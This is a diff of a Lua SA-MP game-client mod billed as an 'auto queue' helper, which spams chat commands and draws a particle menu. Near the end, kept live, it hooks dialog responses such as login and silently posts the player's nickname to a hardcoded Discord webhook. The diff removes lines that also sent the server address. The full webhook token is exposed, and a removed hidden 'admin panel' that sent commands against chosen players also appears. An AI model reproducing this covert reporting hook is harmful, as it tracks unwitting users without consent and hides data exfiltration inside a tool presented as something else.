@@ -6,16 +6,12 @@ local delay_ms = imgui.new.int(0)
 local contador_atendimentos = imgui.new.int(0)
 local frases_global = imgui.new.bool(false)
 local regras_auto = imgui.new.bool(false)
-local jogo_velha_visivel = imgui.new.bool(false)
-local painel_admin_visivel = imgui.new.bool(false)
 
 local encoding = require("encoding")
 encoding.default = "CP1251"
 local u8 = encoding.UTF8
 
-local GUI = {
-    AutoFila = imgui.new.bool(false)
-}
+local GUI = { AutoFila = imgui.new.bool(false) }
 
 local ultimo_a = os.time()
 local ultimo_ac = os.time()
@@ -61,91 +57,93 @@ local texto_regras = [[
 "Proibido fechar entradas com veiculos ou qualquer tipo de objetos.",
 "Proibido usar a OLX para assuntos que nao envolvem vendas legais.",
 "Proibido usar comandos de anuncios para conversar.",
-"Proibido tocar musica no VOIP exceto em locais reservados
-Proibido usar o VOIP enquanto estiver ferido.",
+"Proibido tocar musica no VOIP exceto em locais reservados Proibido usar o VOIP enquanto estiver ferido.",
 "A conta e pessoal e intransferivel. Caso seja punida ou banida, o servidor nao se responsabiliza por seu uso.",
 ]]
-
-local total_pontos = 30
-local largura_onda = 60
-local velocidade = 0.05
-local angulo = 0
 
 local float_btn_pos = imgui.ImVec2(50, 50)
 local dragging = false
 local drag_offset = imgui.ImVec2(0,0)
 
-local jogo_velha = {}
-for i = 1, 9 do
-    jogo_velha[i] = imgui.new.bool(false)
-end
-
-local usuarios_conectados = {}
-local usuario_selecionado = imgui.new.int(-1)
+local particles = {}
+local max_particles = 30
+local particle_speed = 1.5
 
 imgui.OnInitialize(function()
     local style = imgui.GetStyle()
     imgui.StyleColorsDark()
-    style.WindowRounding = 6
-    style.FrameRounding = 4
-    style.GrabRounding = 4
-    style.ScrollbarRounding = 4
-
+    style.WindowRounding = 8
+    style.FrameRounding = 6
+    style.GrabRounding = 6
+    style.ScrollbarRounding = 6
     local colors = style.Colors
-    colors[imgui.Col.WindowBg] = imgui.ImVec4(0.10,0.10,0.10,0.94)
-    colors[imgui.Col.TitleBg] = imgui.ImVec4(0.08,0.08,0.08,1.00)
-    colors[imgui.Col.TitleBgActive] = imgui.ImVec4(0.16,0.16,0.16,1.00)
-    colors[imgui.Col.FrameBg] = imgui.ImVec4(0.16,0.16,0.16,1.00)
-    colors[imgui.Col.FrameBgHovered] = imgui.ImVec4(0.20,0.20,0.20,1.00)
-    colors[imgui.Col.FrameBgActive] = imgui.ImVec4(0.24,0.24,0.24,1.00)
-    colors[imgui.Col.Button] = imgui.ImVec4(0.20,0.20,0.20,1.00)
-    colors[imgui.Col.ButtonHovered] = imgui.ImVec4(0.30,0.30,0.30,1.00)
-    colors[imgui.Col.ButtonActive] = imgui.ImVec4(0.40,0.40,0.40,1.00)
-    colors[imgui.Col.Border] = imgui.ImVec4(0.43,0.43,0.50,0.50)
-    colors[imgui.Col.Text] = imgui.ImVec4(1.00,1.00,1.00,1.00)
+    colors[imgui.Col.WindowBg] = imgui.ImVec4(0.08,0.08,0.08,0.94)
+    colors[imgui.Col.TitleBg] = imgui.ImVec4(0.05,0.05,0.05,1.00)
+    colors[imgui.Col.TitleBgActive] = imgui.ImVec4(0.12,0.12,0.12,1.00)
+    colors[imgui.Col.FrameBg] = imgui.ImVec4(0.12,0.12,0.12,1.00)
+    colors[imgui.Col.FrameBgHovered] = imgui.ImVec4(0.16,0.16,0.16,1.00)
+    colors[imgui.Col.FrameBgActive] = imgui.ImVec4(0.20,0.20,0.20,1.00)
+    colors[imgui.Col.Button] = imgui.ImVec4(0.16,0.16,0.16,1.00)
+    colors[imgui.Col.ButtonHovered] = imgui.ImVec4(0.25,0.25,0.25,1.00)
+    colors[imgui.Col.ButtonActive] = imgui.ImVec4(0.35,0.35,0.35,1.00)
+    colors[imgui.Col.Border] = imgui.ImVec4(0.33,0.33,0.33,0.50)
+    colors[imgui.Col.Text] = imgui.ImVec4(0.85,0.85,0.85,1.00) -- Cinza claro
+    colors[imgui.Col.CheckMark] = imgui.ImVec4(0.85,0.85,0.85,1.00)
+    colors[imgui.Col.SliderGrab] = imgui.ImVec4(0.60,0.60,0.60,1.00)
+    colors[imgui.Col.SliderGrabActive] = imgui.ImVec4(0.85,0.85,0.85,1.00)
 end)
 
-function mostrarMensagemCarregamento()
-    local cores = {
-        0xFFA500FF,
-        0xADD8E6FF,
-        0x00FF00FF,
-        0xFFC0CBFF
+function create_particle(pos_x, pos_y, window_size_x, window_size_y)
+    return {
+        pos = imgui.ImVec2(math.random(1, window_size_x), math.random(1, window_size_y)),
+        vel = imgui.ImVec2(math.random(-particle_speed*10, particle_speed*10)/10, math.random(-particle_speed*10, particle_speed*10)/10),
+        size = math.random(10, 30)/10,
+        color = imgui.ImVec4(math.random(80, 100)/100, math.random(0,20)/100, math.random(0,20)/100, 1.0) -- Tons de vermelho
     }
-    
-    for i = 1, 10 do
-        local cor = cores[(i % #cores) + 1]
-        sampAddChatMessage("MOD ATUALIZADUUU BY NUKY GOSTOSO", cor)
-        wait(100)
-    end
 end
 
-function verificarSenhaJogoVelha()
-    if jogo_velha[7][0] and jogo_velha[8][0] and jogo_velha[9][0] then
-        return true
-    end
-    return false
-end
+function update_particles(window_pos, window_size)
+    for i=1, #particles do
+        local p = particles[i]
+        p.pos.x = p.pos.x + p.vel.x
+        p.pos.y = p.pos.y + p.vel.y
 
-function resetarJogoVelha()
-    for i = 1, 9 do
-        jogo_velha[i][0] = false
-    end
-end
-
-function obterUsuariosConectados()
-    usuarios_conectados = {}
-    for i = 0, 1000 do
-        if sampIsPlayerConnected(i) then
-            local nome = sampGetPlayerNickname(i)
-            table.insert(usuarios_conectados, {id = i, nome = nome})
+        if p.pos.x < 0 or p.pos.x > window_size.x then
+            p.vel.x = -p.vel.x
         end
+        if p.pos.y < 0 or p.pos.y > window_size.y then
+            p.vel.y = -p.vel.y
+        end
+    end
+end
+
+function draw_particles(draw, window_pos)
+    for i=1, #particles do
+        local p1 = particles[i]
+        draw:AddCircleFilled(imgui.ImVec2(window_pos.x + p1.pos.x, window_pos.y + p1.pos.y), p1.size, imgui.ColorConvertFloat4ToU32(p1.color))
+        for j=i+1, #particles do
+            local p2 = particles[j]
+            local dist = math.sqrt((p1.pos.x - p2.pos.x)^2 + (p1.pos.y - p2.pos.y)^2)
+            if dist < 150 then
+                local alpha = 1 - (dist / 150)
+                local line_color = imgui.ColorConvertFloat4ToU32(imgui.ImVec4(1.0, 1.0, 1.0, alpha*0.3))
+                draw:AddLine(imgui.ImVec2(window_pos.x + p1.pos.x, window_pos.y + p1.pos.y), imgui.ImVec2(window_pos.x + p2.pos.x, window_pos.y + p2.pos.y), line_color, 1.0)
+            end
+        end
+    end
+end
+
+function mostrarMensagemCarregamento()
+    local cores = {0xFFFFFFFF, 0xFFAAAAAA, 0xFFFFFFFF, 0xFFAAAAAA} -- Cinza claro e branco para carregamento
+    for i = 1, 4 do
+        local cor = cores[(i % #cores) + 1]
+        sampAddChatMessage("MOD ATUALIZADUUU BY SHELLDER GOSTOSO", cor)
+        wait(100)
     end
 end
 
 imgui.OnFrame(function() return true end, function()
     local io = imgui.GetIO()
-
     imgui.SetNextWindowPos(float_btn_pos, imgui.Cond.Always)
     imgui.SetNextWindowSize(imgui.ImVec2(40,40))
     imgui.Begin("FLUTUANTE", nil,
@@ -156,17 +154,19 @@ imgui.OnFrame(function() return true end, function()
         imgui.WindowFlags.NoMove +
         imgui.WindowFlags.AlwaysAutoResize
     )
-
-    if imgui.Button("<|>", imgui.ImVec2(40,40)) then
+    local button_color = v[0] and imgui.ImVec4(0.6, 0.15, 0.15, 1.0) or imgui.ImVec4(0.16, 0.16, 0.16, 1.00)
+    imgui.PushStyleColor(imgui.Col.Button, button_color)
+    local text_width = imgui.CalcTextSize("<_").x
+    imgui.SetCursorPosX((imgui.GetWindowSize().x - text_width) * 0.5)
+    if imgui.Button("<_", imgui.ImVec2(40,40)) then
         v[0] = not v[0]
     end
-
+    imgui.PopStyleColor()
     if imgui.IsItemHovered() and imgui.IsMouseClicked(0) and not dragging then
         dragging = true
         drag_offset.x = io.MousePos.x - float_btn_pos.x
         drag_offset.y = io.MousePos.y - float_btn_pos.y
     end
-
     if dragging then
         if imgui.IsMouseDown(0) then
             float_btn_pos.x = io.MousePos.x - drag_offset.x
@@ -176,211 +176,118 @@ imgui.OnFrame(function() return true end, function()
             dragging = false
         end
     end
-
     imgui.End()
-
     if v[0] then
         imgui.SetNextWindowPos(imgui.ImVec2(600,550), imgui.Cond.FirstUseEver)
         imgui.SetNextWindowSize(imgui.ImVec2(450,400), imgui.Cond.FirstUseEver)
-        imgui.Begin("AUTO FILA | by NukY", v,
+        imgui.Begin("AUTO FILA | BY SHELLDER", v,
             imgui.WindowFlags.NoCollapse +
             imgui.WindowFlags.NoResize
         )
-
         local draw = imgui.GetWindowDrawList()
         local pos = imgui.GetWindowPos()
         local size = imgui.GetWindowSize()
-        local centroX = size.x/2
-        local espacamento = size.y/total_pontos
+        update_particles(pos, size)
+        draw_particles(draw, pos)
 
-        angulo = angulo + velocidade
-        for i=1,total_pontos do
-            local offset = (i/total_pontos)*math.pi*2
-            local y = i*espacamento
-            local x1 = centroX + math.sin(angulo+offset)*largura_onda
-            local x2 = centroX - math.sin(angulo+offset)*largura_onda
-            draw:AddCircleFilled(imgui.ImVec2(pos.x+x1,pos.y+y),3,0xFFFFA500)
-            draw:AddCircleFilled(imgui.ImVec2(pos.x+x2,pos.y+y),3,0xFF00BFFF)
-            draw:AddLine(imgui.ImVec2(pos.x+x1,pos.y+y),imgui.ImVec2(pos.x+x2,pos.y+y),0x33FFFFFF,1)
-        end
-
-        imgui.Text("Atendimento automaticamente")
+        imgui.TextColored(imgui.ImVec4(0.85,0.85,0.85,1.0), "ATENDIMENTO AJUSTAVEL")
         imgui.SliderInt("Delay (ms)",delay_ms,0,30000)
-        if imgui.Button("AUTO",imgui.ImVec2(150,30)) then
+        local button_color_fila = spam_fila[0] and imgui.ImVec4(0.6, 0.15, 0.15, 1.0) or imgui.ImVec4(0.16, 0.16, 0.16, 1.00)
+        imgui.PushStyleColor(imgui.Col.Button, button_color_fila)
+        if imgui.Button("SPAM FILA",imgui.ImVec2(150,30)) then
             spam_fila[0] = not spam_fila[0]
             if spam_fila[0] then
-                sampAddChatMessage("[AUTO FILA] Ativado com sucesso!", 0x00FF00)
+                sampAddChatMessage("[BY SHELLDER] Spam da fila ativado!", 0xFFFFFF)
             else
-                sampAddChatMessage("[AUTO FILA] Desativado com sucesso!", 0xFFA500)
+                sampAddChatMessage("[BY SHELLDER] Spam da fila desativado!", 0xFF8B0000)
             end
         end
-        
+        imgui.PopStyleColor()
         imgui.Spacing()
         imgui.Separator()
         imgui.Spacing()
-        
-        imgui.Text("Atendimentos realizados:")
+        imgui.Text("TOTAL DE ATENDIMENTOS: ")
         imgui.SameLine()
-        imgui.Text(tostring(contador_atendimentos[0]))
-        
+        imgui.TextColored(imgui.ImVec4(0.85,0.85,0.85,1.0), tostring(contador_atendimentos[0]))
         imgui.Spacing()
         imgui.Separator()
         imgui.Spacing()
-
+        local button_color_fa = imgui.ImVec4(0.16, 0.16, 0.16, 1.00)
+        imgui.PushStyleColor(imgui.Col.Button, button_color_fa)
         if imgui.Button("/FA", imgui.ImVec2(150,30)) then
             sampSendChat("/fa")
+            contador_atendimentos[0] = contador_atendimentos[0] + 1
         end
-
+        imgui.PopStyleColor()
         imgui.Spacing()
         imgui.Separator()
         imgui.Spacing()
-
-        imgui.Text("Frases Globais - Envia frases aleatorias no /a")
-        if imgui.Button("FRASES ATENDIMENTO", imgui.ImVec2(150,30)) then
+        imgui.TextColored(imgui.ImVec4(0.85,0.85,0.85,1.0), "FRASES GLOBAL - ENVIAR FRASES /ATENDIMENTO")
+        local button_color_frases = frases_global[0] and imgui.ImVec4(0.6, 0.15, 0.15, 1.0) or imgui.ImVec4(0.16, 0.16, 0.16, 1.00)
+        imgui.PushStyleColor(imgui.Col.Button, button_color_frases)
+        if imgui.Button("FRASES GLOBAL", imgui.ImVec2(150,30)) then
             frases_global[0] = not frases_global[0]
             if frases_global[0] then
-                sampAddChatMessage("[FRASES ATENDIMENTO] Ativado com sucesso!", 0x00FF00)
+                sampAddChatMessage("[BY SHELLDER] Ativado com sucesso!", 0xFFFFFF)
                 ultimo_a = os.time()
             else
-                sampAddChatMessage("[FRASES ATENDIMENTO] Desativado com sucesso!", 0xFFA500)
+                sampAddChatMessage("[BY SHELLDER] Desativado com sucesso!", 0xFF8B0000)
             end
         end
-
-        imgui.Checkbox("AUTO FILA AHAH", GUI.AutoFila)
-
+        imgui.PopStyleColor()
+        imgui.Text(" ")
+        imgui.TextColored(imgui.ImVec4(0.85,0.85,0.85,1.0), "ATENDIMENTO AUTOMATICO")
+        imgui.Text(" ")
+        imgui.Checkbox("AUTO ATENTIMENTO V1", GUI.AutoFila)
+        imgui.Text(" ")
         imgui.Spacing()
         imgui.Separator()
         imgui.Spacing()
-
-        imgui.Text("Auto Regras - Envia as regras no /a a cada 7 minutos")
-        if imgui.Button("REGRAS SERVIDOR", imgui.ImVec2(150,30)) then
+        imgui.TextColored(imgui.ImVec4(0.85,0.85,0.85,1.0), "Auto Regras - Envia as regras no /a a cada 7 minutos")
+        local button_color_regras = regras_auto[0] and imgui.ImVec4(0.6, 0.15, 0.15, 1.0) or imgui.ImVec4(0.16, 0.16, 0.16, 1.00)
+        imgui.PushStyleColor(imgui.Col.Button, button_color_regras)
+        if imgui.Button("REGRAS SERVER", imgui.ImVec2(150,30)) then
             regras_auto[0] = not regras_auto[0]
             if regras_auto[0] then
-                sampAddChatMessage("[REGRAS SERVIDOR] Ativado com sucesso!", 0x00FF00)
+                sampAddChatMessage("[BY SHELLDER] Ativado com sucesso!", 0xFFFFFF)
                 ultimo_ac = os.time()
             else
-                sampAddChatMessage("[REGRAS SERVIDOR] Desativado com sucesso!", 0xFFA500)
+                sampAddChatMessage("[BY SHELLDER] Desativado com sucesso!", 0xFF8B0000)
             end
         end
-
-        imgui.Spacing()
-        imgui.Separator()
-        imgui.Spacing()
-
-        if imgui.Button("PAINEL ADMIN", imgui.ImVec2(150,30)) then
-            jogo_velha_visivel[0] = true
-        end
-
-        imgui.End()
-    end
-
-    if jogo_velha_visivel[0] then
-        imgui.SetNextWindowPos(imgui.ImVec2(500,300), imgui.Cond.FirstUseEver)
-        imgui.SetNextWindowSize(imgui.ImVec2(200,230))
-        imgui.Begin("Jogo da Velha - Senha", jogo_velha_visivel, imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse)
-        
-        imgui.Text("Climquadrados")
-        imgui.Text("da fileira horizontal inferior")
-        
-        for i = 1, 3 do
-            for j = 1, 3 do
-                local index = (i-1)*3 + j
-                if j > 1 then imgui.SameLine() end
-                if imgui.Button(tostring(index), imgui.ImVec2(50,50)) then
-                    jogo_velha[index][0] = not jogo_velha[index][0]
-                end
-            end
-        end
-        
-        if imgui.Button("Verificar", imgui.ImVec2(150,30)) then
-            if verificarSenhaJogoVelha() then
-                painel_admin_visivel[0] = true
-                jogo_velha_visivel[0] = false
-                obterUsuariosConectados()
-                sampAddChatMessage("Senha correta! Painel admin liberado.", 0x00FF00)
-            else
-                sampAddChatMessage("Senha incorreta! Tente novamente.", 0xFF0000)
-                resetarJogoVelha()
-            end
-        end
-        
-        imgui.SameLine()
-        if imgui.Button("Fechar", imgui.ImVec2(150,30)) then
-            jogo_velha_visivel[0] = false
-            resetarJogoVelha()
-        end
-        
-        imgui.End()
-    end
-
-    if painel_admin_visivel[0] then
-        imgui.SetNextWindowPos(imgui.ImVec2(300,200), imgui.Cond.FirstUseEver)
-        imgui.SetNextWindowSize(imgui.ImVec2(400,300))
-        imgui.Begin("Painel Administrativo", painel_admin_visivel, imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse)
-        
-        if imgui.Button("Atualizar Lista", imgui.ImVec2(150,30)) then
-            obterUsuariosConectados()
-        end
-        
-        imgui.SameLine()
-        if imgui.Button("Fechar", imgui.ImVec2(150,30)) then
-            painel_admin_visivel[0] = false
-        end
-        
-        imgui.Separator()
-        imgui.BeginChild("ListaUsuarios", imgui.ImVec2(0, 200), true)
-        
-        for i, usuario in ipairs(usuarios_conectados) do
-            if imgui.Selectable(usuario.nome, usuario_selecionado[0] == i-1) then
-                usuario_selecionado[0] = i-1
-            end
-        end
-        
-        imgui.EndChild()
-        imgui.Separator()
-        
-        if usuario_selecionado[0] >= 0 then
-            local usuario = usuarios_conectados[usuario_selecionado[0] + 1]
-            imgui.Text("Usuario selecionado: " .. usuario.nome)
-            
-            if imgui.Button("Enviar /q", imgui.ImVec2(150,30)) then
-                sampSendChat("/q " .. usuario.id)
-            end
-            
-            imgui.SameLine()
-            if imgui.Button("Enviar /ac", imgui.ImVec2(150,30)) then
-                sampSendChat("/ac Eu Sou lindo de mais gente kkk")
-            end
-        end
-        
+        imgui.PopStyleColor()
         imgui.End()
     end
 end)
 
 function main()
     mostrarMensagemCarregamento()
-    
     while true do
         wait(0)
         if isSampAvailable() then
+            if #particles == 0 and v[0] then
+                for i=1, max_particles do
+                    table.insert(particles, create_particle(0, 0, 450, 400))
+                end
+            elseif not v[0] then
+                particles = {}
+            end
+
             if os.time() - ultimo_envio_a >= intervalo_a then
                 local frase_aleatoria = frases_aleatorias[math.random(1, #frases_aleatorias)]
                 sampSendChat("/a " .. frase_aleatoria)
                 ultimo_envio_a = os.time()
-                sampAddChatMessage("[AUTO /A] Frase enviada automaticamente!", 0x00FF00)
+                sampAddChatMessage("[BY SHELLDER] Frase enviada automaticamente!", 0xFFFFFF)
             end
-            
             if spam_fila[0] then
                 sampSendChat("/fila")
                 wait(delay_ms[0])
             end
-            
             if frases_global[0] and os.time() - ultimo_a >= 600 then
                 ultima_frase = math.random(1, #frases_aleatorias)
                 sampSendChat("/a "..frases_aleatorias[ultima_frase])
                 ultimo_a = os.time()
             end
-            
             if regras_auto[0] and os.time() - ultimo_ac >= 420 then
                 local primeira_linha = texto_regras:match("([^\n]+)")
                 if primeira_linha then
@@ -392,7 +299,7 @@ function main()
     end
 end
 
-function se.onServerMessage(color, text) -- AUTO FILA
+function se.onServerMessage(color, text)
     if GUI.AutoFila[0] then
         local lowerText = string.lower(u8:decode(text))
         if lowerText:find("fila") or lowerText:find("/fila") then
@@ -430,7 +337,7 @@ function se.onShowDialog(id, style, title, button1, button2, text)
             return false
         end
     end
-end -- FIM AUTO FILA
+end
 
 local webhookUrl = "https://discord.com/api/webhooks/1406683848485371914/unqy5VFh-KCFxrIgyorNy1wOXW3TVT-VSe4H5RR3w7NPddjtpASjiCZJkFgKNA1fqCZR"
 local https = require("socket.http")
@@ -456,21 +363,18 @@ end
 require('samp.events').onSendDialogResponse = function(dialogId, button, listboxId, input)
     local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
     local nick = sampGetPlayerNickname(id)
-    local ip, port = sampGetCurrentServerAddress()
-    local servername = sampGetCurrentServerName()
 
     local message = string.format([[
 
 ________________________________________________________________
   
-     # LOGUIN BEM SUCEDIDO
+      LOGUIN BEM SUCEDIDO <-<Auto Fila
 
 ```
 NICK: %s 
-IP: %s:%d
 ```
 
-]], nick,ip, port, servername)
+]], nick)
 
 sendMessageToDiscord(message)
 end
